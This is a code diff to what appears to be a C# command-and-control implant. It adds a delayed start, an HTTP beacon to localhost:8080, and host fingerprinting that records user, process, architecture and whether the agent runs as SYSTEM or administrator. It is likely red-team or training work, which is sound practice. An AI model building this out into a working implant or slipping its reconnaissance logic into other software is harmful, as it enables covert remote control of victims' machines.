@@ -17,11 +17,15 @@ namespace Agent
 
         static void Main(string[] args)
         {
+            Thread.Sleep(20000);
+
             GenerateMetadata();
 
             _commModule = new HttpCommModule("localhost", 8080);
             _commModule.Init(_metadata);
             _commModule.Start();
+
+            _tokenSource = new CancellationTokenSource();
 
             while (!_tokenSource.IsCancellationRequested)
             {
@@ -31,7 +35,6 @@ namespace Agent
                 }
             }
         }
-
         public void Stop()
         {
             _tokenSource.Cancel();
@@ -40,31 +43,33 @@ namespace Agent
         static void GenerateMetadata()
         {
             var process = Process.GetCurrentProcess();
+            var identity = WindowsIdentity.GetCurrent();
+            var principal = new WindowsPrincipal(identity);
 
-            string userName = Environment.UserName;
             string integrity = "Medium";
 
-            if (userName.Equals("SYSTEM"))
-                integrity = "SYSTEM";
-
-            using (var identity = WindowsIdentity.GetCurrent())
+            if (identity.IsSystem)
             {
-                if (identity.User != identity.Owner)
-                {
-                    integrity = "High";
-                }
+                integrity = "SYSTEM";
+            }
+            else if (principal.IsInRole(WindowsBuiltInRole.Administrator))
+            {
+                integrity = "High";
             }
 
             _metadata = new AgentMetaData()
             {
                 Id = Guid.NewGuid().ToString(),
                 HostName = Environment.MachineName,
-                UserName = userName,
+                UserName = identity.Name,
                 ProcessName = process.ProcessName,
                 ProcessId = process.Id,
                 Integrity = integrity,
-                Architecture = Environment.Is64BitOperatingSystem ? "x64" : "x86"
+                Architecture = IntPtr.Size == 8 ? "x64" : "x86"
             };
+
+            process.Dispose();
+            identity.Dispose();
         }
     }
 }
